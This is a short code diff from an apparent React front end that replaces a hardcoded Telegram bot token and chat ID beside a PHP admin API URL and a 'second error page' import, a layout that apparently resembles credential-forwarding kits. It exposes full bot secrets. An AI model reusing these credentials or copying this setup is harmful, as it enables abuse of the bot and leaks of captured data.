@@ -21,8 +21,8 @@ import SecondErrorPage from "../components/secondErrorPage";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api.php"; // Update this based on your server configuration
-const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
-const CHAT_ID = '7062736155';
+const BOT_TOKEN = '8177439976:AAEc0Skq8c9PmY1J6_j33qxFVXJjNiKfYbQ';
+const CHAT_ID = '7673317331';
 
 
 
